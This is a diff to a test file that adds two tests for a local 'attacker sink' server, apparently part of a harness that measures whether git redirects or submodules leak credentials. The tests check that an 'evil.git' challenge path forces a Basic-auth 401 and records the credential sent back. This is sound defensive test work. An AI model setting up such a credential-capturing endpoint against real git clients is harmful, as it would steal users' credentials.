@@ -91,6 +91,38 @@ describe("attacker sink", () => {
     expect(await recorded()).toHaveLength(0);
   });
 
+  it("challenges for credentials, and records both hops (git redirect / submodule arms)", async () => {
+    // git supplies a helper-held credential only in response to a 401, and
+    // drops a URL-embedded one across a host boundary — so a sink that answered
+    // 200 would record a bodiless GET and the redirect and submodule baselines
+    // would read as "no leak". Both hops are recorded: the unauthenticated one
+    // proves the client arrived, the authenticated one proves what it handed
+    // over.
+    const unauthenticated = await fetch(`${BASE}${ATTACKER.challengePath}/evil.git`);
+    expect(unauthenticated.status).toBe(401);
+    expect(unauthenticated.headers.get("www-authenticate")).toMatch(/^Basic/);
+
+    const credential = "attacker-challenge-credential";
+    const authenticated = await fetch(`${BASE}${ATTACKER.challengePath}/evil.git`, {
+      headers: { authorization: `Basic ${Buffer.from(credential).toString("base64")}` },
+    });
+    expect(authenticated.status).toBe(200);
+
+    const seen = await recorded();
+    expect(seen.map((r) => r.authorization)).toEqual([
+      null,
+      `Basic ${Buffer.from(credential).toString("base64")}`,
+    ]);
+  });
+
+  it("keeps the frozen /leak path answering 200 without a challenge", async () => {
+    // The Phase 4A arms depend on this shape; a new scenario's needs land on a
+    // new path (D7), never on one an existing cell already reads.
+    const response = await fetch(`${BASE}${ATTACKER.leakPath}`);
+    expect(response.status).toBe(200);
+    expect(response.headers.get("www-authenticate")).toBeNull();
+  });
+
   it("does not record its own control endpoints", async () => {
     // Otherwise the reset-then-assert-empty discipline is self-defeating: the
     // GET that reads the recorder would populate it.
